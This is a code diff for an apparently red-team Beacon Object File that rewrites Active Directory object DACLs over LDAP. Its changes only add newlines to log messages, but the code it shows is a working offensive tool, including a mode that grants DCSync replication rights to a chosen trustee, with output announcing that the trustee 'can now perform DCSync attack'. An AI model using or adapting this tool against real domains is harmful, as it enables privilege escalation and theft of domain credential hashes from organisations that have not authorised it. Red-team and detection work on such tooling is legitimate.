@@ -37,17 +37,17 @@ void go(char *args, int alen) {
     
     // Validate required parameters
     if (!targetIdentifier || MSVCRT$strlen(targetIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target identifier is required\n");
         return;
     }
     
     if (!trusteeIdentifier || MSVCRT$strlen(trusteeIdentifier) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Trustee identifier is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Trustee identifier is required\n");
         return;
     }
     
     if (!accessMaskStr || MSVCRT$strlen(accessMaskStr) == 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Access mask is required");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Access mask is required\n");
         return;
     }
     
@@ -63,8 +63,8 @@ void go(char *args, int alen) {
     
     if (isDCSync) {
         // DCSync requires 2 ACEs with different GUIDs
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] DCSync operation detected");
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Will add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] DCSync operation detected\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Will add DS-Replication-Get-Changes and DS-Replication-Get-Changes-All\n");
         
         // Parse the two DCSync GUIDs
         MSVCRT$memset(&dcsyncGuid1, 0, sizeof(GUID));
@@ -72,14 +72,14 @@ void go(char *args, int alen) {
         
         if (!StringToGuid(GUID_DS_REPLICATION_GET_CHANGES, &dcsyncGuid1) ||
             !StringToGuid(GUID_DS_REPLICATION_GET_CHANGES_ALL, &dcsyncGuid2)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse DCSync GUIDs");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse DCSync GUIDs\n");
             return;
         }
         
         // Allocate array for 2 ACEs
         acesToAdd = (ACE_TO_ADD*)MSVCRT$malloc(2 * sizeof(ACE_TO_ADD));
         if (!acesToAdd) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
             return;
         }
         
@@ -101,20 +101,20 @@ void go(char *args, int alen) {
         
     } else {
         // Single ACE - parse parameters
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Access Mask: %s", accessMaskStr);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Access Mask: %s\n", accessMaskStr);
         
         ACCESS_MASK accessMask = ParseAccessMask(accessMaskStr);
         if (accessMask == 0) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse access mask");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse access mask\n");
             return;
         }
         
         BYTE aceType = ParseAceType(aceTypeStr);
         BYTE aceFlags = ParseAceFlags(aceFlagsStr);
         
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed access mask: 0x%08x", accessMask);
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE type: 0x%02x (%s)", aceType, GetAceTypeString(aceType));
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE flags: 0x%02x", aceFlags);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed access mask: 0x%08x\n", accessMask);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE type: 0x%02x (%s)\n", aceType, GetAceTypeString(aceType));
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Parsed ACE flags: 0x%02x\n", aceFlags);
         
         // Parse GUIDs if provided
         GUID* pObjectTypeGuid = NULL;
@@ -124,9 +124,9 @@ void go(char *args, int alen) {
             MSVCRT$memset(&objectTypeGuid, 0, sizeof(GUID));
             if (StringToGuid(objectTypeGuidStr, &objectTypeGuid)) {
                 pObjectTypeGuid = &objectTypeGuid;
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Object Type GUID");
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Object Type GUID\n");
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Object Type GUID");
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Object Type GUID\n");
                 return;
             }
         }
@@ -135,24 +135,24 @@ void go(char *args, int alen) {
             MSVCRT$memset(&inheritedObjectTypeGuid, 0, sizeof(GUID));
             if (StringToGuid(inheritedObjectTypeGuidStr, &inheritedObjectTypeGuid)) {
                 pInheritedObjectTypeGuid = &inheritedObjectTypeGuid;
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Inherited Object Type GUID");
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Parsed Inherited Object Type GUID\n");
             } else {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Inherited Object Type GUID");
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to parse Inherited Object Type GUID\n");
                 return;
             }
         }
         
         if (aceTypeStr && MSVCRT$strlen(aceTypeStr) > 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Type: %s", aceTypeStr);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Type: %s\n", aceTypeStr);
         }
         if (aceFlagsStr && MSVCRT$strlen(aceFlagsStr) > 0) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Flags: %s", aceFlagsStr);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] ACE Flags: %s\n", aceFlagsStr);
         }
         
         // Allocate single ACE
         acesToAdd = (ACE_TO_ADD*)MSVCRT$malloc(sizeof(ACE_TO_ADD));
         if (!acesToAdd) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
             return;
         }
         
@@ -167,7 +167,7 @@ void go(char *args, int alen) {
     
     // Display optional parameters
     if (searchOu && MSVCRT$strlen(searchOu) > 0) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Search OU: %s", searchOu);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Search OU: %s\n", searchOu);
     }
     if (dcAddress && MSVCRT$strlen(dcAddress) > 0) {
     }
@@ -175,11 +175,11 @@ void go(char *args, int alen) {
     }
     
     // Initialize LDAP connection
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing LDAP connection...");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Initializing LDAP connection...\n");
     char* dcHostname = NULL;
     LDAP* ld = InitializeLDAPConnection(dcAddress, useLdaps, &dcHostname);
     if (!ld) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize LDAP connection\n");
         if (acesToAdd) MSVCRT$free(acesToAdd);
         return;
     }
@@ -187,7 +187,7 @@ void go(char *args, int alen) {
     // Get default naming context
     char* defaultNC = GetDefaultNamingContext(ld, dcHostname);
     if (!defaultNC) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get default naming context\n");
         if (dcHostname) MSVCRT$free(dcHostname);
         if (acesToAdd) MSVCRT$free(acesToAdd);
         CleanupLDAP(ld);
@@ -209,7 +209,7 @@ void go(char *args, int alen) {
         targetDN = (char*)MSVCRT$malloc(len);
         if (targetDN) {
             MSVCRT$strcpy(targetDN, defaultNC);
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using domain root: %s", targetDN);
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Using domain root: %s\n", targetDN);
         }
     } else if (isTargetDN) {
         size_t len = MSVCRT$strlen(targetIdentifier) + 1;
@@ -221,13 +221,13 @@ void go(char *args, int alen) {
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         targetDN = FindObjectDN(ld, targetIdentifier, searchBase);
         if (!targetDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found", targetIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Target '%s' not found\n", targetIdentifier);
             goto cleanup;
         }
     }
     
     if (!targetDN) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve target DN\n");
         goto cleanup;
     }
     
@@ -243,39 +243,39 @@ void go(char *args, int alen) {
         char* searchBase = (searchOu && MSVCRT$strlen(searchOu) > 0) ? searchOu : defaultNC;
         trusteeDN = FindObjectDN(ld, trusteeIdentifier, searchBase);
         if (!trusteeDN) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Trustee '%s' not found", trusteeIdentifier);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Trustee '%s' not found\n", trusteeIdentifier);
             goto cleanup;
         }
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved trustee DN: %s", trusteeDN);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Resolved trustee DN: %s\n", trusteeDN);
     }
     
     // Get trustee's SID
     pTrusteeSid = GetObjectSid(ld, trusteeDN);
     if (!pTrusteeSid) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get trustee's objectSid");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get trustee's objectSid\n");
         goto cleanup;
     }
     
     if (!ADVAPI32$IsValidSid(pTrusteeSid)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Retrieved trustee SID is invalid");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Retrieved trustee SID is invalid\n");
         goto cleanup;
     }
     
     char* trusteeSidStr = SidToString(pTrusteeSid);
     if (trusteeSidStr) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Trustee SID: %s", trusteeSidStr);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Trustee SID: %s\n", trusteeSidStr);
         MSVCRT$free(trusteeSidStr);
     }
     
     // Read current security descriptor
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Reading security descriptor...");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Reading security descriptor...\n");
     sdBerval = ReadSecurityDescriptor(ld, targetDN);
     if (!sdBerval) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read security descriptor\n");
         goto cleanup;
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Read security descriptor (%d bytes)", sdBerval->bv_len);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Read security descriptor (%d bytes)\n", sdBerval->bv_len);
     
     // Get current DACL
     PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)sdBerval->bv_val;
@@ -284,21 +284,21 @@ void go(char *args, int alen) {
     BOOL daclDefaulted = FALSE;
     
     if (!ADVAPI32$GetSecurityDescriptorDacl(pSD, &daclPresent, &pOldDacl, &daclDefaulted)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get DACL from security descriptor");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get DACL from security descriptor\n");
         goto cleanup;
     }
     
     if (!daclPresent) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] No DACL present - will create new one");
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] No DACL present - will create new one\n");
     } else if (pOldDacl) {
         ACL_SIZE_INFORMATION aclInfo;
         if (ADVAPI32$GetAclInformation(pOldDacl, &aclInfo, sizeof(aclInfo), AclSizeInformation)) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] Current DACL has %d ACE(s)", aclInfo.AceCount);
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Current DACL has %d ACE(s)\n", aclInfo.AceCount);
         }
     }
     
     // Add ACE(s) in a loop
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Adding %d ACE(s)...", aceCount);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Adding %d ACE(s)...\n", aceCount);
     
     pNewDacl = pOldDacl; // Start with existing DACL
     
@@ -307,11 +307,11 @@ void go(char *args, int alen) {
         
         if (isDCSync) {
             char* guidName = GetGuidFriendlyName(currentAce->pObjectTypeGuid);
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE %d/%d: %s", i+1, aceCount, 
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE %d/%d: %s\n", i+1, aceCount, 
                         guidName ? guidName : "Extended Right");
             if (guidName) MSVCRT$free(guidName);
         } else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE: Access=0x%08x, Type=%s", 
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Adding ACE: Access=0x%08x, Type=%s\n", 
                         currentAce->accessMask, GetAceTypeString(currentAce->aceType));
         }
         
@@ -327,7 +327,7 @@ void go(char *args, int alen) {
         );
         
         if (!pTempDacl) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create DACL with ACE %d", i+1);
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create DACL with ACE %d\n", i+1);
             // If this isn't the first ACE, free the previous new DACL
             if (i > 0 && pNewDacl != pOldDacl) {
                 MSVCRT$free(pNewDacl);
@@ -341,19 +341,19 @@ void go(char *args, int alen) {
         }
         
         pNewDacl = pTempDacl;
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] ACE %d/%d added successfully", i+1, aceCount);
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] ACE %d/%d added successfully\n", i+1, aceCount);
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] All ACEs added to DACL");
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] All ACEs added to DACL\n");
     
     // Build new security descriptor
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Building new security descriptor...");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Building new security descriptor...\n");
     
     BYTE absoluteSDBuffer[SECURITY_DESCRIPTOR_MIN_LENGTH];
     PSECURITY_DESCRIPTOR pNewSD = (PSECURITY_DESCRIPTOR)absoluteSDBuffer;
     
     if (!ADVAPI32$InitializeSecurityDescriptor(pNewSD, SECURITY_DESCRIPTOR_REVISION)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize security descriptor");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize security descriptor\n");
         goto cleanup;
     }
     
@@ -374,7 +374,7 @@ void go(char *args, int alen) {
     
     // Set the new DACL
     if (!ADVAPI32$SetSecurityDescriptorDacl(pNewSD, TRUE, pNewDacl, FALSE)) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set DACL");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set DACL\n");
         goto cleanup;
     }
     
@@ -391,32 +391,32 @@ void go(char *args, int alen) {
     // Convert to self-relative format for LDAP
     newSdBerval = ConvertSecurityDescriptorToBerval(pNewSD);
     if (!newSdBerval) {
-        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor");
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to convert security descriptor\n");
         goto cleanup;
     }
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Security descriptor ready (%d bytes)", newSdBerval->bv_len);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Security descriptor ready (%d bytes)\n", newSdBerval->bv_len);
     
     // Write back to LDAP
-    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Writing modified security descriptor...");
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Writing modified security descriptor...\n");
     BOOL writeSuccess = WriteSecurityDescriptor(ld, targetDN, newSdBerval);
     
     if (writeSuccess) {
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: ACE(s) added successfully!");
-        BeaconPrintf(CALLBACK_OUTPUT, "[+] Added: %d ACE(s)", aceCount);
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: ACE(s) added successfully!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Added: %d ACE(s)\n", aceCount);
         
         if (isDCSync) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[+] DCSync rights granted, Trustee can now perform DCSync attack");
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] DCSync rights granted, Trustee can now perform DCSync attack\n");
         }
         
         // Verify
-        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Verifying changes...");
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Verifying changes...\n");
         BERVAL* verifyBerval = ReadSecurityDescriptor(ld, targetDN);
         if (verifyBerval) {
             PSD_INFO verifyInfo = ParseSecurityDescriptor((BYTE*)verifyBerval->bv_val, 
                                                           verifyBerval->bv_len);
             if (verifyInfo) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[+] Verification: DACL now has %d ACE(s)", 
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Verification: DACL now has %d ACE(s)\n", 
                             verifyInfo->DaclAceCount);
                 FreeSecurityDescriptorInfo(verifyInfo);
             }
@@ -424,7 +424,7 @@ void go(char *args, int alen) {
             MSVCRT$free(verifyBerval);
         }
     } else {
-        BeaconPrintf(CALLBACK_ERROR, "\n[-] FAILED to add ACE(s)");
+        BeaconPrintf(CALLBACK_ERROR, "\n[-] FAILED to add ACE(s)\n");
     }
 
 cleanup:
